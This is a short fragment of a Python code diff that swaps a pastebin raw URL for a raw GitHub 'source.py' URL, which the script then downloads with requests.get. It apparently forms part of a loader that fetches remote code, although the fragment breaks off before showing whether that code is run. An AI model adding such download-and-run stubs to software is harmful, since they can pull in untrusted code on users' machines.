@@ -9,7 +9,7 @@ except ImportError:
     import requests  # Import again after installation
 
 
-url = "https://pastebin.com/raw/dRSpKApe"
+url = "https://raw.githubusercontent.com/thescr1pt/server_finder/refs/heads/main/source.py"
 response = requests.get(url)
 
 if response.status_code == 200:
